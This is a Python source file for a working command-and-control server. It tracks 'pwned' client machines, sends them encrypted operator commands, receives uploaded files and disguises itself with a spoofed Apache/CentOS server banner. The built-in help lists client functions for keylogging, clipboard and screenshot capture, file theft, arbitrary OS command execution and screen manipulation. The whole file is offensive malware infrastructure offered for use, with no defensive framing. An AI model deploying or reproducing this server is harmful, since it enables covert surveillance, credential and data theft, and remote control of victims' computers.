#!/bin/python3

from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from os import path, mkdir, system, listdir
from urllib.parse import unquote_plus
from inputimeout import inputimeout, TimeoutOccurred
from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
from encryption import cipher
from settings import (PORT, CMD_REQUEST, CWD_RESPONSE, INPUT_TIMEOUT, KEEP_ALIVE_CMD, RESPONSE, RESPONSE_KEY,
                      BIND_ADDR, FILE_REQUEST, FILE_SEND, INCOMING, ZIP_PASSWORD, OUTGOING, SHELL, LOG)


def get_new_client():

    global active_client, pwned_dict, pwned_id, cwd

    # Reinitialize cwd to its starting value of tilde
    cwd = "~"

    # If the dictionary has only one 'dead' entry, re-initialize it and the other variables
    if len(pwned_dict) == 1:
        print("Waiting for new connections.\n")
        pwned_dict = {}
        pwned_id = 0
        active_client = 1
    else:
        # Display clients in our dictionary and choose one of them to switch over to
        while True:
            for key, value in pwned_dict.items():
                if key != active_client:
                    print(key, "-", value)
            try:
                new_client = int(input("\nChoose a pwned id to make active: "))
            except ValueError:
                print("\nYou must choose a pwned id of one of the clients shown on the screen.\n")
                continue

            # If chosen pwned id is in dict and not active, set new active client to it and remove the old entry
            if new_client in pwned_dict and new_client != active_client:
                old_active_client = active_client
                active_client = new_client
                del pwned_dict[old_active_client]
                print(f"\nActive client is now: {pwned_dict[active_client]}")
                break
            else:
                print("\nYou must choose a pwned id of one of the clients shown on the screen.\n")
                continue


class C2Handler(BaseHTTPRequestHandler):
  
    server_version = "Apache/2.4.58"
    sys_version = "(CentOS)"

    def do_GET(self):
        # These variables must be global as they will often be updated via multiple sessions
        global active_client, client_account, client_hostname, pwned_dict, pwned_id

        # Follow this code block when the client is requesting a command
        if self.path.startswith(CMD_REQUEST):

            # Split out the client from the HTTP GET request
            client = self.path.split(CMD_REQUEST)[1]

            # Encode the client data because decrypt requires it, then decrypt, then decode
            client = cipher.decrypt(client.encode()).decode()

            # Split out the client account name
            client_account = client.split('@')[0]

            # Split out the client hostname
            client_hostname = client.split('@')[1]

            # If the client is NOT in our pwned_dict dictionary:
            if client not in pwned_dict.values():

                # Sends the HTTP response code and header back to the client
                self.http_response(404)

                # Increment our pwned_id and add the client to pwned_dict using pwned_id as the key
                pwned_id += 1
                pwned_dict[pwned_id] = client

                # Print the good news to our screen and log the connection
                print(f"{client_account}@{client_hostname} has been pwned!\n")
                with open(LOG, "a") as file_handle:
                    file_handle.write(f"{datetime.now()}, {self.client_address}, {pwned_dict[pwned_id]}\n")

            # If the client is in pwned_dict, and it is also our active client:
            elif client == pwned_dict[active_client]:

                # If INPUT_TIMEOUT is set, run inputtimeout instead of regular input
                if INPUT_TIMEOUT:

                    # Azure kills a waiting HTTP GET session after 4 minutes, so we must handle input with a timeout
                    try:
                        # Collect the command to run on the client; set Linux style prompt
                        command = inputimeout(prompt=f"{client_account}@{client_hostname}:{cwd}$ ",
                                              timeout=INPUT_TIMEOUT)

                    # If a timeout occurs on our input, do a simple command to trigger a new connection
                    except TimeoutOccurred:
                        command = KEEP_ALIVE_CMD
                else:
                    # Use normal input; collect the command to run on the client; set Linux style prompt
                    command = input(f"{client_account}@{client_hostname}:{cwd}$ ")

                # If we start a command with 'server ', it means we want to run a c2 server command
                if command.startswith("server "):

                    # The 'server show clients' command will display pwned systems and our active client info
                    if command == "server show clients":
                        print("Available pwned clients:")
                        print_last = None
                        for key, value in pwned_dict.items():
                            if key == active_client:
                                print_last = str(key) + " - " + value
                            else:
                                print(key, "-", value)
                        print("\nYour active client:", print_last, sep="\n")

                    # The 'server control PWNED_ID' command allows us to change our active client
                    elif command.startswith("server control"):

                        # Make sure the supplied pwned id is valid, and if so, make the switch
                        try:
                            possible_active_client = int(command.split()[2])
                            if possible_active_client in pwned_dict:
                                active_client = possible_active_client
                                print(f"Waiting for {pwned_dict[active_client]} to wake up.")
                            else:
                                raise ValueError
                        except (ValueError, IndexError):
                            print("You must enter a proper pwned id.  Use server show clients command.")

                    # The 'server zip FILENAME' command allows us to zip-encrypt files on the server
                    elif command.startswith("server zip"):
                        filename = " ".join(command.split()[2:])
                        if not filename:
                            print(f"You must enter the filename to zip, located in {OUTGOING}.\n")
                        else:
                            try:
                                if not path.isfile(f"{OUTGOING}/{filename}"):
                                    raise OSError
                                with AESZipFile(f"{OUTGOING}/{filename}.zip", "w", compression=ZIP_LZMA,
                                                encryption=WZ_AES) as zip_file:
                                    zip_file.setpassword(ZIP_PASSWORD)
                                    zip_file.write(f"{OUTGOING}/{filename}", filename)
                                    print(f"{OUTGOING}/{filename} is now zip-encrypted.\n")
                            except OSError:
                                print(f"Unable to access {OUTGOING}/{filename}.\n")

                    # The 'server unzip FILENAME' command allows us to unzip/decrypt files on the server
                    elif command.startswith("server unzip"):
                        filename = " ".join(command.split()[2:])
                        if not filename:
                            print(f"You must enter the filename to unzip, located in {INCOMING}.\n")
                        else:
                            # Unzip AES encrypted file that is setting in our incoming folder
                            try:
                                with AESZipFile(f"{INCOMING}/{filename}") as zip_file:
                                    zip_file.setpassword(ZIP_PASSWORD)
                                    zip_file.extractall(INCOMING)
                                    print(f"{INCOMING}/{filename} is now unzipped and decrypted.\n")
                            except OSError:
                                print(f"{filename} was not found in {INCOMING}.\n")

                    # The 'server list DIRECTORY' command allows us to list files in a folder on the server
                    elif command.startswith("server list"):
                        directory = None
                        try:
                            directory = command.split()[2]
                            print(*listdir(directory), sep="\n")
                        except NotADirectoryError:
                            print(f"{directory} is not a directory.")
                        except FileNotFoundError:
                            print(f"{directory} was not found on the server.")
                        except IndexError:
                            print(*listdir(), sep="\n")

                    # The 'server exit' command will shut down our c2 server; clients don't die
                    elif command == "server exit":
                        print("The c2 server has been shut down.")
                        server.shutdown()

                    # The 'server shell' command gives us a shell on the c2 server.
                    elif command == "server shell":
                        print("Type exit to return to the c2 server's terminal window.")
                        system(SHELL)
                      
                    # The 'server help' command reminds us of what our commands are and do
                    elif command == "server help":
                        print("Client Commands:",
                              "client download FILENAME - transfer a file from the server to the client",
                              "client upload FILENAME - transfer a file from the client to the server",
                              "client zip FILENAME - zip and encrypt a file on the client",
                              "client unzip FILENAME - unzip and decrypt a file on the client",
                              "client kill - permanently shutdown the active client",
                              "client delay SECONDS - change the delay setting for a client's reconnection attempts",
                              "client get clipboard - grab a copy of the client's clipboard",
                              "client keylog on - start up a keylogger on the client",
                              "client keylog off - turn off the keylogger on the client and write the results to disk",
                              "client type TEXT - type the text of your choice on a client's keyboard",
                              "client screenshot - grab a copy of the client's screens",
                              "client display IMAGE - display an image on the client's screen",
                              "client flip screen - flip a client's screen upside down (Windows only)",
                              "client roll screen - roll a client's screen (Windows only)",
                              "client max volume - turn a client's volume all the way up",
                              "client play FILENAME.wav - play a .wav sound file on the client (Windows only)",
                              "* - run an OS command on the client that doesn't require input",
                              "* & - run an OS command on the client in the background", sep="\n")
                        print("\nServer Commands:",
                              "server show clients - print an active listing of our pwned clients",
                              "server control PWNED_ID - change the active client that you have a prompt for",
                              "server zip FILENAME - zip and encrypt a file in the outgoing folder on the server",
                              "server unzip FILENAME - unzip and decrypt a file in the incoming folder on the server",
                              "server exit - gracefully shuts down the server",
                              "server list DIRECTORY - obtain a file listing of a directory on the server",
                              "server shell - obtain a shell on the server", sep="\n")

                    # Must respond to the client after a server command in order to cleanly finish the connection
                    self.http_response(204)

                # Write the command back to the client as a response; must byte encode and encrypt
                else:
                    try:
                        self.http_response(200)
                        self.wfile.write(cipher.encrypt(command.encode()))

                    # If an exception occurs, notify us and get a new client to set active
                    except OSError:
                        print(f"Lost connection to {pwned_dict[active_client]}.\n")
                        get_new_client()
                    else:
                        # If we have just killed a client, try to get a new client to set active
                        if command == "client kill":
                            print(f"{pwned_dict[active_client]} has been killed.\n")
                            get_new_client()

            # The client is in pwned_dict, but it is not our active client:
            else:
                self.http_response(404)

        # Follow this code block when the client is requesting a file
        elif self.path.startswith(FILE_REQUEST):

            # Split out the encrypted filepath from the HTTP GET request
            filepath = self.path.split(FILE_REQUEST)[1]

            # Encode the filepath because decrypt requires it, then decrypt, then decode
            filepath = cipher.decrypt(filepath.encode()).decode()

            # Read the requested file into memory, encrypt it, and stream it back for the client's GET response
            try:
                with open(f"{filepath}", "rb") as file_handle:
                    self.http_response(200)
                    self.wfile.write(cipher.encrypt(file_handle.read()))
            except OSError:
                print(f"{filepath} was not found on the c2 server.")
                self.http_response(404)

        # Nobody should ever be accessing our c2 server using HTTP GET other than to the above paths
        else:
            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server using HTTP GET.  Why?\n")

    def do_POST(self):
        # Follow this code block when the client is responding with data to be printed on the screen
        if self.path == RESPONSE:
            print(self.handle_post_data())

        # Follow this code block when the client is responding with its current working directory
        elif self.path == CWD_RESPONSE:
            global cwd
            cwd = self.handle_post_data()

        # Nobody should ever be posting to our c2 server other than to the above paths
        else:
            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server using HTTP POST.  Why?\n")

    def do_PUT(self):
        # Follow this code block when the client is sending the server a file
        if self.path.startswith(FILE_SEND + "/"):
            self.http_response(200)

            # Split out the encrypted filename from the HTTP PUT request
            filename = self.path.split(FILE_SEND + "/")[1]

            # Encode the filename because decrypt requires it, then decrypt, then decode
            filename = cipher.decrypt(filename.encode()).decode()

            # This adds the file name to our incoming folder
            incoming_file = INCOMING + "/" + filename

            # We need the content length to properly read in the file
            file_length = int(self.headers['Content-Length'])

            # Read the file stream, decrypt it, and then write to disk
            with open(incoming_file, 'wb') as file_handle:
                file_handle.write(cipher.decrypt(self.rfile.read(file_length)))
            print(f"{incoming_file} has been written to the c2 server.")

        # Nobody should ever get here using an HTTP PUT method
        else:
            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server using HTTP PUT.  Why?\n")

    def handle_post_data(self):
        # Sends the HTTP response code and header back to the client
        self.http_response(200)

        # Get Content-Length value from HTTP Headers
        content_length = int(self.headers.get("Content-Length"))

        # Gather the client's data by reading in the HTTP POST data
        client_data = self.rfile.read(content_length)

        # UTF-8 decode the client's data
        client_data = client_data.decode()

        # Remove the HTTP POST variable and the equal sign from the client's data
        client_data = client_data.replace(f"{RESPONSE_KEY}=", "", 1)

        # HTML/URL decode the client's data and translate '+' to a space
        client_data = unquote_plus(client_data)

        # Encode the client data because decrypt requires it, then decrypt, then decode
        client_data = cipher.decrypt(client_data.encode()).decode()

        # Return the processed client's data
        return client_data

    def http_response(self, code: int):
        self.send_response(code)
        self.end_headers()

    def log_request(self, code="-", size="-"):
        return


# This maps to the client that we have a prompt for
active_client = 1

# This is the current working directory from the active client
cwd = "~"

# This is the account from the active client
client_account = ""

# This is the hostname from the active client
client_hostname = ""

# Used to uniquely count and track each client connecting in to the c2 server
pwned_id = 0

# Tracks all pwned clients; key = pwned_id and value is unique from each client (account@hostname@epoch time)
pwned_dict = {}

# If the storage directory is not present on our c2 server, create it
if not path.isdir(INCOMING):
    mkdir(INCOMING)

# If the outgoing directory is not present on our c2 server, create it
if not path.isdir(OUTGOING):
    mkdir(OUTGOING)

# Instantiate our ThreadingHTTPServer object
server = ThreadingHTTPServer((BIND_ADDR, PORT), C2Handler)
print("Waiting for new connections.\n")

# Run the server in an infinite loop
server.serve_forever()
